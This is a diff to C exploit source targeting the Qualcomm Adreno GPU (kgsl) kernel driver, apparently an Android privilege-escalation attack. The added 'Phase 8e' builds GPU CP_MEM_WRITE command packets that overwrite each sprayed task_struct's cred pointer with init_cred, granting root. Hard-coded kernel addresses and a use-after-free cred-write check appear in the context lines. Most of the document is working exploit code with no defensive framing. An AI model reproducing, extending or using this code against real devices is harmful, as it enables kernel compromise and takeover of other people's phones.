@@ -81,11 +81,8 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012D97D08ULL
-#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
-#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
 #define CRED_OFF    0x740
-#define REAL_CRED_OFF 0x738
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
@@ -619,7 +616,7 @@ int main(int argc, char **argv) {
             printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
                 (unsigned long long)v0, (unsigned long long)v1,
                 (v0 == 0xCAFEBABEDEADBEEFULL &&
-                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
+                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" :
                  (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
         }
     }
@@ -726,6 +723,35 @@ int main(int argc, char **argv) {
                     cd[31], cd[30], cd[4]);
             }
         }
+    }
+
+    if (n_task > 0 && init_cred_addr != 0) {
+        printf("[*] Phase 8e: Overwriting task_struct->cred to init_cred\n");
+        for (int p = 0; p < n_task; p++) {
+            uint64_t task_va = task_pages[p];
+            uint64_t cred_ptr_off = task_va + CRED_OFF;
+            printf("  task[%d] va=0x%lx, writing cred pointer at 0x%lx to 0x%lx\n",
+                p, (unsigned long)task_va, (unsigned long)cred_ptr_off, (unsigned long)init_cred_addr);
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            uint32_t zl, zh;
+            split64(cred_ptr_off, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            split64(init_cred_addr, &zl, &zh);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+                __sync_synchronize();
+                flush_dc_civac_range((void*)task_va, 0x1000);
+            }
+        }
+        printf("  Phase 8e: %d task_structs updated\n", n_task);
     }
 
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
